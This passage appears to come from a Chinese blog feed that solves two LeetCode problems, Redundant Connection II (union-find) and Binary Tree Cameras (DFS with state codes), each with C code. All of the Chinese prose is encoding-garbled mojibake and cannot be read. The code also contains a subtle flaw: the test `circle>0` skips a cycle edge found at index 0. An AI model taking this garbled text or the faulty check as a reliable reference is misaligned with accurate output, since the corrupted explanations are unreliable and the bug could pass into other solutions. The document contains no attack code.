‘åªæœ‰ä¸€ä¸ªæ ¹èŠ‚ç‚¹ï¼Œæ‰€æœ‰å…¶ä»–èŠ‚ç‚¹éƒ½æ˜¯è¯¥æ ¹èŠ‚ç‚¹çš„åç»§ã€‚æ¯ä¸€ä¸ªèŠ‚ç‚¹åªæœ‰ä¸€ä¸ªçˆ¶èŠ‚ç‚¹ï¼Œé™¤äº†æ ¹èŠ‚ç‚¹æ²¡æœ‰çˆ¶èŠ‚ç‚¹ã€‚</p><p>è¾“å…¥ä¸€ä¸ªæœ‰å‘å›¾ï¼Œè¯¥å›¾ç”±ä¸€ä¸ªæœ‰ç€Nä¸ªèŠ‚ç‚¹ (èŠ‚ç‚¹å€¼ä¸é‡å¤1, 2, â€¦, N) çš„æ ‘åŠä¸€æ¡é™„åŠ çš„è¾¹æ„æˆã€‚é™„åŠ çš„è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹åŒ…å«åœ¨1åˆ°Nä¸­é—´ï¼Œè¿™æ¡é™„åŠ çš„è¾¹ä¸å±äºæ ‘ä¸­å·²å­˜åœ¨çš„è¾¹ã€‚</p><p>ç»“æœå›¾æ˜¯ä¸€ä¸ªä»¥è¾¹ç»„æˆçš„äºŒç»´æ•°ç»„ã€‚ æ¯ä¸€ä¸ªè¾¹ çš„å…ƒç´ æ˜¯ä¸€å¯¹ [u, v]ï¼Œç”¨ä»¥è¡¨ç¤ºæœ‰å‘å›¾ä¸­è¿æ¥é¡¶ç‚¹ u å’Œé¡¶ç‚¹ v çš„è¾¹ï¼Œå…¶ä¸­ u æ˜¯ v çš„ä¸€ä¸ªçˆ¶èŠ‚ç‚¹ã€‚</p><p>è¿”å›ä¸€æ¡èƒ½åˆ é™¤çš„è¾¹ï¼Œä½¿å¾—å‰©ä¸‹çš„å›¾æ˜¯æœ‰Nä¸ªèŠ‚ç‚¹çš„æœ‰æ ¹æ ‘ã€‚è‹¥æœ‰å¤šä¸ªç­”æ¡ˆï¼Œè¿”å›æœ€åå‡ºç°åœ¨ç»™å®šäºŒç»´æ•°ç»„çš„ç­”æ¡ˆã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: [[1,2], [1,3], [2,3]]<br>è¾“å‡º: [2,3]<br>è§£é‡Š: ç»™å®šçš„æœ‰å‘å›¾å¦‚ä¸‹:<br>1<br>&#x2F; <br>v   v<br>2â€“&gt;3<br>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: [[1,2], [2,3], [3,4], [4,1], [1,5]]<br>è¾“å‡º: [4,1]<br>è§£é‡Š: ç»™å®šçš„æœ‰å‘å›¾å¦‚ä¸‹:<br>5 &lt;- 1 -&gt; 2<br>  ^    |<br>  |    v<br>  4 &lt;- 3<br>æ³¨æ„:</p><p>äºŒç»´æ•°ç»„å¤§å°çš„åœ¨3åˆ°1000èŒƒå›´å†…ã€‚<br>äºŒç»´æ•°ç»„ä¸­çš„æ¯ä¸ªæ•´æ•°åœ¨1åˆ°Nä¹‹é—´ï¼Œå…¶ä¸­ N æ˜¯äºŒç»´æ•°ç»„çš„å¤§å°ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/redundant-connection-ii">https://leetcode-cn.com/problems/redundant-connection-ii</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>æ³¨ï¼šè¯¥é¢˜ä¸º2020.9.17çš„æ¯æ—¥ä¸€é¢˜</p></blockquote><h4 id="è§£æ³•ï¼šå¹¶æŸ¥é›†-1"><a href="#è§£æ³•ï¼šå¹¶æŸ¥é›†-1" class="headerlink" title="è§£æ³•ï¼šå¹¶æŸ¥é›†"></a>è§£æ³•ï¼šå¹¶æŸ¥é›†</h4><p>åŠå¤œä¸‰ç‚¹å¤šæŠŠå‰ç½®é¢˜ï¼š<a href="https://leetcode-cn.com/problems/redundant-connection/">684. å†—ä½™è¿æ¥</a>ç»™åšäº†ï¼Œæ„Ÿè§‰ç¨å¾®æœ‰äº†ç‚¹å¤´ç»ªï¼Œ<del>å…¶å®è¿˜æ˜¯å•¥éƒ½ä¸çŸ¥é“</del>â€¦</p><p>æ™šä¸Šå¤§æ¦‚æƒ³æ¸…æ¥šäº†ï¼ŒåŒæ ·æ˜¯é‡‡ç”¨å¹¶æŸ¥é›†çš„æ€æƒ³ï¼Œä¸è¿‡è€ƒè™‘åˆ°è¯¥å›¾ä¸ºæœ‰å‘å›¾ï¼ŒåŒæ—¶é¢˜ç›®ç»™å®šçš„å›¾<strong>å¿…å®šæœ‰ä¸”ä»…æœ‰ä¸€æ¡å¤šä½™çš„è¾¹ä½¿å¾—è¯¥å›¾æ— æ³•æˆä¸ºä¸€é¢—æ ‘</strong></p><p>å¯èƒ½å­˜åœ¨å¦‚ä¸‹æƒ…å†µï¼š</p><ul><li><strong>ä¸€ä¸ªèŠ‚ç‚¹çš„å…¥åº¦å¤§äºç­‰äº2</strong>ï¼ˆ<strong>å­˜åœ¨ä¸¤ä¸ªåŠä»¥ä¸Šçˆ¶ç»“ç‚¹ï¼Œæœ¬é¢˜æ•°æ®æ„é€ ä¿è¯åªå¯èƒ½å­˜åœ¨ä¸¤ä¸ªçˆ¶ç»“ç‚¹çš„æƒ…å†µ</strong>ï¼‰</li><li><strong>å›¾ä¸­å­˜åœ¨å›è·¯</strong></li><li><strong>ä»¥ä¸Šä¸¤ç§æƒ…å†µåŒæ—¶å­˜åœ¨</strong></li></ul><p>å¦‚ä¸‹å›¾æ‰€ç¤ºï¼ˆå­—ä¸‘è§è°…QwQï¼‰ï¼š</p><p><img src="https://i.loli.net/2020/09/18/HTi1XVUF7SuIRM3.png" alt="33A2C56517F4926A49A4C03363AECFD0.png"></p><p>æ•…æˆ‘ä»¬å¾ˆå®¹æ˜“ï¼ˆå¹¶ä¸Or2ï¼‰èƒ½å¤Ÿå¾—åˆ°è§£å¼€è¿™é“é¢˜çš„ç®—æ³•ï¼š</p><ul><li><strong>å°†æ¯ä¸€ä¸ªç»“ç‚¹åˆå§‹åŒ–ä¸ºä¸€æ£µå•ç‹¬çš„æ ‘ï¼Œå…¶çˆ¶ç»“ç‚¹åˆå§‹åŒ–ä¸ºè‡ªèº«</strong></li><li><strong>ä½¿ç”¨ä¸¤ä¸ªæ•°ç»„åˆ†åˆ«ä¿å­˜æ¯ä¸ªç»“ç‚¹çš„çˆ¶ç»“ç‚¹ä¸æ‰€å±çš„æ ‘çš„æ ¹ç»“ç‚¹</strong></li><li><strong>éå†æ¯ä¸€æ¡è¾¹ï¼Œé‡æ–°è®°å½•ä¸‹æ¯ä¸ªç»“ç‚¹çš„çˆ¶ç»“ç‚¹ä¸æ ¹èŠ‚ç‚¹</strong></li><li><strong>å½“ä¸€ä¸ªç»“ç‚¹çš„å…¥åº¦å¤§äº1æ—¶ï¼ˆå‡ºç°ç¬¬äºŒä¸ªä¸æ˜¯è‡ªèº«ç»“ç‚¹çš„çˆ¶äº²ï¼‰ï¼Œè®°å½•è¯¥è¾¹ä¸ºäº‰è®®è¾¹</strong></li><li><strong>å½“ä¸€æ¡è¾¹çš„å§‹æœ«ç»“ç‚¹åŒå±äºä¸€æ£µæ ‘æ—¶ï¼Œè®°å½•è¯¥æ¡è¾¹ä¸ºå›è·¯è¾¹</strong></li><li><strong>ä¸¤ç§æƒ…å†µéƒ½ä¸å­˜åœ¨ï¼Œåˆ™å°†è¯¥è¾¹çš„æœ«ç»“ç‚¹çš„çˆ¶ç»“ç‚¹æ ‡ä¸ºè¯¥è¾¹çš„å§‹ç»“ç‚¹ï¼Œå¹¶åˆå¹¶ä¸¤ç»“ç‚¹æ‰€åœ¨çš„æ ‘</strong></li><li><strong>å½“äº‰è®®è¾¹ä¸å­˜åœ¨æ—¶ï¼Œç›´æ¥åˆ é™¤å›è·¯è¾¹</strong></li><li><strong>äº‰è®®è¾¹è‹¥å­˜åœ¨ï¼Œè‹¥åŒæ—¶å­˜åœ¨å›è·¯è¾¹ï¼Œåˆ™åˆ é™¤äº‰è®®è¾¹æœ«å°¾ç»“ç‚¹åŠå…¶çˆ¶ç»“ç‚¹æ‰€æ„æˆè¾¹ï¼Œå¦åˆ™åˆ é™¤äº‰è®®è¾¹</strong></li></ul><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Note: The returned array must be malloced, assume caller calls free().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> * ancestors;<span class="comment">//ï¼ˆå¹¶æŸ¥é›†ï¼‰è®°å½•æ¯ä¸ªèŠ‚ç‚¹çš„æ ¹ç»“ç‚¹</span></span><br><span class="line"><span class="type">int</span> * parent;<span class="comment">//è®°å½•æ¯ä¸ªèŠ‚ç‚¹çš„çˆ¶ç»“ç‚¹</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">find_x</span><span class="params">(<span class="type">int</span> x)</span><span class="comment">//æŸ¥æ‰¾è¯¥ç»“ç‚¹æ‰€å±æ ‘çš„æ ¹ç»“ç‚¹</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> x == ancestors[x] ? x : (ancestors[x] = find_x(ancestors[x]));<span class="comment">//è·¯å¾„å‹ç¼©</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">union_ancestor</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">    ancestors[find_x(a)] = find_x(b);<span class="comment">//å°†ä¸¤æ£µæ ‘åˆå¹¶ä¸ºä¸€æ£µæ ‘</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* <span class="title function_">findRedundantDirectedConnection</span><span class="params">(<span class="type">int</span>** edges, <span class="type">int</span> edgesSize, <span class="type">int</span>* edgesColSize, <span class="type">int</span>* returnSize)</span></span><br><span class="line">&#123;    </span><br><span class="line">    ancestors = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line">    parent = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*(edgesSize+<span class="number">5</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        parent[i] = ancestors[i] = i;<span class="comment">//åˆå§‹åŒ–æ¯ä¸ªç»“ç‚¹ä¸ºå•ç‹¬çš„ä¸€æ£µæ ‘ï¼ˆå¹¶æŸ¥é›†ï¼‰ï¼Œç»“ç‚¹çš„çˆ¶ç»“ç‚¹æ ‡è®°ä¸ºè‡ªèº«</span></span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//conflictï¼šå¯èƒ½å­˜åœ¨äº‰è®®çš„è¾¹</span></span><br><span class="line">    <span class="comment">//circleï¼šå¯èƒ½å½¢æˆå›è·¯çš„è¾¹</span></span><br><span class="line">    <span class="type">int</span> start, end, a_start, a_end, conflict = <span class="number">-1</span>, circle = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;edgesSize;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        start = edges[i][<span class="number">0</span>];</span><br><span class="line">        end = edges[i][<span class="number">1</span>];</span><br><span class="line">        a_start = find_x(start);</span><br><span class="line">        a_end = find_x(end);</span><br><span class="line">        <span class="keyword">if</span>(parent[end] != end)<span class="comment">//è¯¥æ¡è¾¹çš„å°¾ç»“ç‚¹å·²ç»ä¸å…¶ä»–ç»“ç‚¹ç›¸è¿ï¼ˆå³åŠ ä¸Šè¿™æ¡è¾¹åå…¥åº¦å¤§äº1ï¼‰</span></span><br><span class="line">        &#123;</span><br><span class="line">            conflict = i;<span class="comment">//è®°å½•è¯¥æ¡è¾¹ä¸ºäº‰è®®è¾¹</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            parent[end] = start;</span><br><span class="line">            <span class="keyword">if</span>(a_start == a_end)</span><br><span class="line">            &#123;</span><br><span class="line">                circle = i;<span class="comment">//è¯¥æ¡è¾¹ä¸¤ç»“ç‚¹çš„æ ¹ç»“ç‚¹ç›¸åŒï¼Œå¯èƒ½å½¢æˆå›è·¯</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                union_ancestor(start, end);<span class="comment">//å°†ä¸¤æ£µæ ‘åˆå¹¶ä¸ºä¸€æ£µæ ‘ï¼ˆå¹¶æŸ¥é›†ï¼‰</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> *ret = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*<span class="number">2</span>);</span><br><span class="line">    *returnSize = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(conflict&lt;<span class="number">0</span>)<span class="comment">//ä¸å­˜åœ¨äº‰è®®è¾¹ï¼Œåªå­˜åœ¨å½¢æˆå›è·¯çš„è¾¹</span></span><br><span class="line">    &#123;</span><br><span class="line">        ret[<span class="number">0</span>] = edges[circle][<span class="number">0</span>];</span><br><span class="line">        ret[<span class="number">1</span>] = edges[circle][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span><span class="comment">//å­˜åœ¨äº‰è®®è¾¹</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(circle&gt;<span class="number">0</span>)<span class="comment">//åŒæ—¶å­˜åœ¨å›è·¯è¾¹</span></span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = parent[edges[conflict][<span class="number">1</span>]];</span><br><span class="line">            ret[<span class="number">1</span>] = edges[conflict][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ret[<span class="number">0</span>] = edges[conflict][<span class="number">0</span>];</span><br><span class="line">            ret[<span class="number">1</span>] = edges[conflict][<span class="number">1</span>];</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/18/IahfqNWwzCoA6GU.png" alt="image.png"></p><h2 id="0x01-ç›‘æ§äºŒå‰æ ‘"><a href="#0x01-ç›‘æ§äºŒå‰æ ‘" class="headerlink" title="0x01. ç›‘æ§äºŒå‰æ ‘"></a>0x01.<a href="https://leetcode-cn.com/problems/binary-tree-cameras/"> ç›‘æ§äºŒå‰æ ‘</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªäºŒå‰æ ‘ï¼Œæˆ‘ä»¬åœ¨æ ‘çš„èŠ‚ç‚¹ä¸Šå®‰è£…æ‘„åƒå¤´ã€‚</p><p>èŠ‚ç‚¹ä¸Šçš„æ¯ä¸ªæ‘„å½±å¤´éƒ½å¯ä»¥ç›‘è§†å…¶çˆ¶å¯¹è±¡ã€è‡ªèº«åŠå…¶ç›´æ¥å­å¯¹è±¡ã€‚</p><p>è®¡ç®—ç›‘æ§æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹æ‰€éœ€çš„æœ€å°æ‘„åƒå¤´æ•°é‡ã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_01.png" alt="image.png"></p><p>è¾“å…¥ï¼š[0,0,null,0,0]<br>è¾“å‡ºï¼š1<br>è§£é‡Šï¼šå¦‚å›¾æ‰€ç¤ºï¼Œä¸€å°æ‘„åƒå¤´è¶³ä»¥ç›‘æ§æ‰€æœ‰èŠ‚ç‚¹ã€‚<br>ç¤ºä¾‹ 2ï¼š</p><p><img src="https://assets.leetcode-cn.com/aliyun-lc-upload/uploads/2018/12/29/bst_cameras_02.png" alt="image.png"></p><p>è¾“å…¥ï¼š[0,0,null,0,null,0,null,null,0]<br>è¾“å‡ºï¼š2<br>è§£é‡Šï¼šéœ€è¦è‡³å°‘ä¸¤ä¸ªæ‘„åƒå¤´æ¥ç›‘è§†æ ‘çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚ ä¸Šå›¾æ˜¾ç¤ºäº†æ‘„åƒå¤´æ”¾ç½®çš„æœ‰æ•ˆä½ç½®ä¹‹ä¸€ã€‚</p><p>æç¤ºï¼š</p><p>ç»™å®šæ ‘çš„èŠ‚ç‚¹æ•°çš„èŒƒå›´æ˜¯ [1, 1000]ã€‚<br>æ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½æ˜¯ 0ã€‚</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/binary-tree-cameras">https://leetcode-cn.com/problems/binary-tree-cameras</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><blockquote><p>è¯¥é¢˜ä¸º2020.9.22çš„æ¯æ—¥ä¸€é¢˜</p></blockquote><p>ä»”ç»†æƒ³æƒ³ï¼Œå¯¹äºä¸€ä¸ªç»“ç‚¹æ˜¯å¦éœ€è¦å®‰è£…æ‘„åƒå¤´ï¼Œå…¶å®æ˜¯<strong>ç”±å…¶å­æ ‘çš„çŠ¶æ€æ¥å†³å®šçš„</strong>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>åŠ¨æ€è§„åˆ’ç®—æ³•</strong></p><h3 id="è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰"><a href="#è§£æ³•ï¼šé€’å½’-æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰-åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰" class="headerlink" title="è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰ + åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰"></a>è§£æ³•ï¼šé€’å½’ + æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰ + åŠ¨æ€è§„åˆ’ï¼ˆDPï¼‰</h3><p>å¤§æ¦‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š<br><img src="https://i.loli.net/2020/09/22/5v4sz9fdl2OLau7.png" alt="image.png"></p><p>æˆ‘ä»¬è€ƒè™‘æœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š</p><ul><li><strong>å½“ä¸€ä¸ªç»“ç‚¹çš„å·¦æˆ–å³å­æ ‘æ²¡æœ‰è¢«æ‘„åƒå¤´è¦†ç›–ä¸Šæ—¶ï¼Œè¿™ä¸ªç»“ç‚¹å¿…é¡»è¦å®‰è£…ä¸€ä¸ªæ‘„åƒå¤´æ¥ç›‘æµ‹å…¶å·¦æˆ–å³å­æ ‘ï¼Œå®šä¹‰ä¸ºçŠ¶æ€ç STATUS_CAMERA</strong></li><li><strong>å½“ä¸€ä¸ªç»“ç‚¹çš„å·¦å³å­æ ‘éƒ½å·²ç»è¢«æ‘„åƒå¤´è¦†ç›–ä¸Šæ—¶ï¼Œä¸ºäº†å®ç°æ‘„åƒå¤´æ•°é‡çš„æœ€å°åŒ–ï¼Œéœ€è¦åœ¨è¯¥ç»“ç‚¹çš„çˆ¶ç»“ç‚¹æ”¾ç½®æ‘„åƒå¤´ï¼Œå³åœ¨å›åˆ°çˆ¶ç»“ç‚¹å‰è¯¥ç»“ç‚¹éƒ½æ˜¯æœªè¢«è¦†ç›–çš„ï¼Œå®šä¹‰ä¸ºçŠ¶æ€ç STATUS_UNCOVERED</strong></li><li><strong>å½“ä¸€ä¸ªç»“ç‚¹çš„å·¦å³å­æ ‘ä¸­å­˜åœ¨æ‘„åƒå¤´ï¼Œåˆ™è¯¥ç»“ç‚¹è‚¯å®šæ˜¯è¢«è¦†ç›–äº†çš„ï¼Œå®šä¹‰ä¸ºçŠ¶æ€ç STATUS_COVERED</strong></li><li><strong>å¯¹äºç»“ç‚¹ä¸ºNULLçš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥é»˜è®¤ä»–æ˜¯è¢«è¦†ç›–äº†çš„ç»“ç‚¹ï¼Œå³å®šä¹‰ä¸ºçŠ¶æ€ç STATUS_COVERED</strong></li></ul><p>åŒæ—¶ï¼Œ<strong>æˆ‘ä»¬è¿˜éœ€è¦å¯¹è¿™æ£µæ ‘çš„æ ¹èŠ‚ç‚¹åšä¸€æ¬¡å•ç‹¬çš„æ£€æµ‹ï¼Œä»¥ç¡®å®šæ˜¯å¦è¦åœ¨å…¶ä¸Šæ”¾ç½®æ‘„åƒå¤´</strong></p><p>ä¸ºäº†æ–¹ä¾¿åˆ¤å®šï¼Œæˆ‘ä»¬å°†STATUS_CAMERAè®¾ç½®ä¸ºçŠ¶æ€ç ä¸­å€¼ç›¸å¯¹å¤§çš„ä¸€ä¸ª</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * status code</span></span><br><span class="line"><span class="comment"> * 0: waiting for pwn</span></span><br><span class="line"><span class="comment"> * 1: has been pwn</span></span><br><span class="line"><span class="comment"> * 2: camara here</span></span><br><span class="line"><span class="comment"> *-1: inner error, just a placeholder in fact</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_UNCOVERED 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_COVERED 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_CAMERA 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ERROR -1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">minCameraCover</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> amounts=<span class="number">0</span>;<span class="comment">//amounts of camera</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//add a camera to the root if status of root is 0</span></span><br><span class="line">    <span class="keyword">if</span>(dfs(root,&amp;amounts) == STATUS_UNCOVERED)</span><br><span class="line">        amounts++;</span><br><span class="line">    <span class="keyword">return</span> amounts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> * amounts)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//NULL pointer signed as status 1</span></span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the status of left and right node</span></span><br><span class="line">    <span class="type">int</span> left = dfs(root-&gt;left, amounts);</span><br><span class="line">    <span class="type">int</span> right = dfs(root-&gt;right, amounts);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if one of both uncovered yet, a camera is needed</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_UNCOVERED || right == STATUS_UNCOVERED)</span><br><span class="line">    &#123;</span><br><span class="line">        (*amounts)++;</span><br><span class="line">        <span class="keyword">return</span> STATUS_CAMERA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if both are covered, father&#x27;s of root may need a camera</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_COVERED &amp;&amp; right == STATUS_COVERED)</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNCOVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//if there&#x27;s at least one camera in both childs, the root is covered</span></span><br><span class="line">    <span class="keyword">if</span>(left + right &gt; STATUS_CAMERA)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//error code(not used)</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/64ytrK3gLNGowbf.png" alt="EE8895_CCLKZDA_OPW4_FT1.png"></p>]]></content>
    
    
